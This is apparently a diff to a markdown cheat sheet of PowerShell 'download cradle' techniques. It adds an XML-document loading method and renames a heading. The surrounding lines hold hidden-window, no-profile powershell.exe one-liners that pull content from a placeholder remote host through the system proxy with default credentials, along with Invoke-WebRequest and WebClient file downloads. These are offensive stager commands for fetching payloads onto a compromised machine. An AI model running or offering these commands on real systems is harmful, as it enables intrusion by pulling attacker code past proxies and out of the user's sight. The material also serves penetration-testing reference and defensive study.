@@ -28,8 +28,14 @@ powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.proxy=[Net.WebR
 powershell.exe -nop -w hidden -c $t=New-Object Net.Webclient; $t.Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials; $t.downloadString('http://<rhost>')
 ```
 
+### Download string - XML Load
+```
+$XmlDoc = New-Object System.Xml.XmlDocument
+$XmlDoc.Load("<urlToXmlFile>")
+$XmlDoc.<node>.<node>.<node>
+```
 
-### Download a file (ignore Internet-Explorer module error) - Invoke-Web-Request
+### Download a file - Invoke-Web-Request
 ```
 iwr 'https://<rhost>' -OutFile <file> -UseBasicParsing
 ```
@@ -59,4 +65,5 @@ $webClient = [Net.WebClient]::new(); $webClient.DownloadFile('https://<rhost>', 
 ```
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::'Tls11,Tls12'
 ```
+
 
